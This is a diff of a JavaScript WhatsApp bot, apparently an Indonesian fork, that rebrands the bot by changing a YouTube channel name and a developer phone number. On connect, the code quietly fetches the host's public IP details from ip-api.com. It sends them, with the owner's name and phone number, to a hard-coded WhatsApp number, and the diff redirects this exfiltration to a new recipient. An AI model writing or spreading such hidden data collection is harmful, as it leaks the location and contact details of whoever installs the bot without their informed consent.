@@ -45,7 +45,7 @@ const starts = async (Ryuu = new WAConnection()) => {
     })
     Ryuu.on('open', () => {
         success('2', 'Done Sudah Terhubung , Subscribe YT : BAYU OFC')
-        Ryuu.sendMessage(`${OwnerNumber}@s.whatsapp.net`, `*Halo Owner ${BotName} 👋*\n\nBot Sekarang Sudah Tersambung Dan Siap Untuk Dipakai 🤙😉\n\nJika Terjadi Emror Hubungi Developer\n\nJangan Lupa Ucapkan Terima Kasih Kepada Developer Bot Serta Jangan Lupa Subrek Youtube BAYU OFC`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/bayuofc.jpg'),sourceUrl:"https://wa.me/6289525518325?text=Assalamualaikum"}}})
+        Ryuu.sendMessage(`${OwnerNumber}@s.whatsapp.net`, `*Halo Owner ${BotName} 👋*\n\nBot Sekarang Sudah Tersambung Dan Siap Untuk Dipakai 🤙😉\n\nJika Terjadi Emror Hubungi Developer\n\nJangan Lupa Ucapkan Terima Kasih Kepada Developer Bot Serta Jangan Lupa Subrek Youtube Fiannsaa 12`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/bayuofc.jpg'),sourceUrl:"https://wa.me/6285656884416?text=Assalamualaikum"}}})
     })
     await Ryuu.connect({timeoutMs: 30*1000})
     fs.writeFileSync('./session.bayu.json', JSON.stringify(Ryuu.base64EncodedAuthInfo(), null, '\t'))
@@ -54,7 +54,7 @@ const starts = async (Ryuu = new WAConnection()) => {
     console.log(color('|WRN|', 'yellow'), color('BOT MEMASUKI GROUP • GRUP BAYU BOT (KAGUYA-BOT) •', 'cyan'))
     fetch(`http://ip-api.com/line`).then(res => res.text())  
     .then(bu =>{
-    Ryuu.sendMessage("6289525518325@s.whatsapp.net", `─────── *INFO USER* ───────\n\n\`\`\`Name        : ${botname}\nName Owner  : ${ownername}\nNomer Owner : ${owner}\nPrefix      : Multi Prefix\`\`\`\n\n─────── *IP ADDRES* ────────\n\n\`\`\`${bu}\`\`\`\n─────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/bayuofc.jpg'),sourceUrl:"https://wa.me/6283891921787?text=Assalamualaikum"}}})
+    Ryuu.sendMessage("6285656884416@s.whatsapp.net", `─────── *INFO USER* ───────\n\n\`\`\`Name        : ${botname}\nName Owner  : ${ownername}\nNomer Owner : ${owner}\nPrefix      : Multi Prefix\`\`\`\n\n─────── *IP ADDRES* ────────\n\n\`\`\`${bu}\`\`\`\n─────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/bayuofc.jpg'),sourceUrl:"https://wa.me/6285656884416?text=Assalamualaikum"}}})
     console.log(color('|WRN|', 'yellow'), color('[ MENGIRIM IP ADDRESS ] KE DEVELOPER BOT', 'cyan'))
     })
     Ryuu.on('chat-update', async (message) => {
